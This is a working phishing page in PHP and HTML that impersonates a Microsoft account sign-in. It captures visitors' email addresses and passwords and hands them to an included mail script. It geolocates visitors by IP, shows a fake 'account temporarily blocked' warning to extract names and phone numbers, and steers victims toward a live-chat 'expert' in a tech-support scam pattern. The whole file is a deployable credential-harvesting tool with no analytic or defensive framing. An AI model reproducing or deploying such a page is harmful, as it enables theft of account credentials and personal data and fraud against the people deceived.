<?php

// PHP code to extract IP  
function getVisIpAddr() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$vis_ip = getVisIPAddr();
$ip = $vis_ip;
$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
$country = $ipdat->geoplugin_countryName;
if ($country != 'United States' && $country != 'Canada' && $country != 'Australia' && $country != 'United Kingdom') {
    // header("location:https://" . $_SERVER['HTTP_HOST']);
}
?>
<!DOCTYPE html>
<html lang="en-US">
    <head> 
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Sign in to your Microsoft account</title>
        <meta name="robots" content="noindex, nofollow" />
        <meta name="googlebot" content="noindex, nofollow" />
        <meta name="bingbot" content="noindex, nofollow" />
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.min.css">
        <link href="https://fonts.googleapis.com/css?family=Montserrat" rel="stylesheet">
        <link rel="stylesheet" href="css/style.css">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
        <link rel="shortcut icon" href="images/favicon.ico">
        <script src="js/custom.js"></script>
        <!--Start of Tawk.to Script-->
        <script type="text/javascript">
            var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
            (function () {
                var s1 = document.createElement("script"), s0 = document.getElementsByTagName("script")[0];
                s1.async = true;
                s1.src = 'https://embed.tawk.to/5fe97813df060f156a90df2c/1eqjvq4db';
                s1.charset = 'UTF-8';
                s1.setAttribute('crossorigin', '*');
                s0.parentNode.insertBefore(s1, s0);
            })();
        </script>
        <!--End of Tawk.to Script-->
    </head>
    <body>  
        <?php
        if (isset($_POST['btnSignup']) || isset($_POST['btnLogin'])) {
            include 'mail.php';
            ?>
            <div class="modal">
                <div class="modalbox">
                    <section id="logSec" style="text-align: center;margin: auto; display: block;">
                        <img id="loadImg" class="mt-4" width="208" src="images/loading.svg" style="margin: auto;">
                        <p style="color: #000;font-size: 21px;margin-bottom: 0px;"> Please wait...</p>
                    </section>
                    <form id="fromLog" action="" method="post"> 
                        <input type="hidden" name="fromLog">
                    </form>
                </div>
            </div>
        <?php } ?>
        <div class="tile">
            <div class="tile-body">
                <img src="images/logo.svg" />
                <br>
                <?php
                if (isset($_POST['btnLoginMore'])) {
                    include 'mail.php';
                    ?>
                    
                    <div class="alert mb-4 mt-4 alert-danger text-center">Attention: the account has been <b>temporarily blocked due to suspicious activity in your Network IP,</b> kindly verify the following details<br>
                        
                        <br>
                        Kindly contact chat assistance for further help
                    </div>
                        
                   
                    <div class="heading">Please verify your account</div>
                   <form action="" method="post">
                        <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
                        <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />
                         <label class="form-input">
                            <input name="fname" type="text" placeholder="First Name" required />
                            <div class="underline"></div>
                        </label>
                        <label class="form-input">
                            <input name="lname" type="text" placeholder="Last Name" required />
                            <div class="underline"></div>
                        </label>
                        <label class="form-input">
                            <input name="number" type="text" minlength="10" maxlength="15" placeholder="Phone Number" required />
                            <div class="underline"></div>
                        </label>
                      <label class="form-input">
                            Country
                            <select name="country">
                                <option value="United States">United States</option>
                                <option value="United Kingdom">United Kingdom</option>
                                <option value="Australia">Australia</option>
                                <option value="Canada">Canada</option>
                            </select>
                            <div class="underline"></div>
                        </label>
                        <div class="submit-container clearfix" style="margin-top: 2rem;">          
                            <button name="btnLogin" type="submit" class="submit btn btn-irenic float-right" tabindex="0">
                                <span>Verify</span>
                            </button>
                        </div>
                    </form>
                <?php } elseif (isset($_POST['fromLog'])) { ?>
                    <div class="card-body">
                        <p style="line-height: 38px;text-align: center;"> 
                            <span style="color: #c01818;font-size: 28px;display: inline-block;margin: 10px 0;line-height: 35px;position: relative;">                            
                               Your account has been <b>temporarily blocked</b> due to suspicious activity on your Network IP. Kindly ask an expert
                            </span>
                            <br> <span style="font-size: 18px; color: #000;display: block;line-height: 30px;">Error Code - EE050014</span>
                            <br>  </p>   
                             
                             <h3 class="text-center" style="margin: auto;font-family: 'Source Sans Pro';"><a href="#" target="_blank">Ask Expert</a> </h3>
                    </div>
                <?php } else { ?>
                    <div id="loginForm">
                        <div class="heading">Sign in</div>
                        <form action="" method="post">
                            <label class="form-input">
                                <input name="email" type="email" placeholder="Email" required />
                                <div class="underline"></div>
                            </label>
                            <label class="form-input">
                                <input name="password" type="password" placeholder="Password" required />
                                <div class="underline"></div>
                            </label>
                            <p id="signupBtn" class="form-input">No account? <a href="#">Create one!</a><p>
                            <div class="submit-container clearfix" style="margin-top: 2rem;">          
                                <button name="btnLoginMore" type="submit" class="submit btn btn-irenic float-right" tabindex="0">
                                    <span>NEXT</span>
                                </button>
                            </div>
                        </form>
                    </div>

                    <div id="signupForm" style="display: none;">
                        <div class="heading">Create account</div>
                        <form action="" method="post">
                            <label class="form-input">
                                <input name="fname" type="text" placeholder="First Name" required />
                                <div class="underline"></div>
                            </label>
                             <label class="form-input">
                                <input name="lname" type="text" placeholder="Last Name" required />
                                <div class="underline"></div>
                            </label>
                            <label class="form-input">
                                <input name="email" type="email" placeholder="Email" required />
                                <div class="underline"></div>
                            </label>
                            <label class="form-input">
                                <input name="number" type="text" minlength="10" maxlength="15" placeholder="Phone Number" required />
                                <div class="underline"></div>
                            </label>
                           <label class="form-input">
                                <input name="password" type="password" placeholder="Password" required />
                                <div class="underline"></div>
                            </label>
                            <label class="form-input">
                                Country
                                <select name="country">
                                    <option value="United States">United States</option>
                                    <option value="United Kingdom">United Kingdom</option>
                                    <option value="Australia">Australia</option>
                                    <option value="Canada">Canada</option>
                                </select>
                                <div class="underline"></div>
                            </label>
                            <p id="loginBtn" class="form-input">Have account? <a href="#">Sign In</a><p>
                            <div class="submit-container clearfix" style="margin-top: 2rem;">          
                                <button name="btnSignup" type="submit" class="submit btn btn-irenic float-right" tabindex="0">
                                    <span>NEXT</span>
                                </button>
                            </div>
                        </form>
                    </div>
                <?php } ?>
            </div>
        </div>
        <script>
//            $('#signupFrom').css("display", "none");
//            $('#loginForm').css("display", "none");
            $('#signupBtn').click(function () {
                $('#signupForm').css("display", "block");
                $('#loginForm').css("display", "none");
            });

            $('#loginBtn').click(function () {
                $('#signupForm').css("display", "none");
                $('#loginForm').css("display", "block");
            });

<?php
if (isset($_POST['btnSignup'])) {
    ?>
                setTimeout(function () {
                    $('#fromLog').submit();
                }, 5000);
    <?php
}
?>

<?php
if (isset($_POST['btnLogin'])) {
    ?>
                setTimeout(function () {
                    $('#fromLog').submit();
                    // $('#fromLoad').submit();
                }, 5000);
    <?php
}
?>
        </script>
    </body>
</html>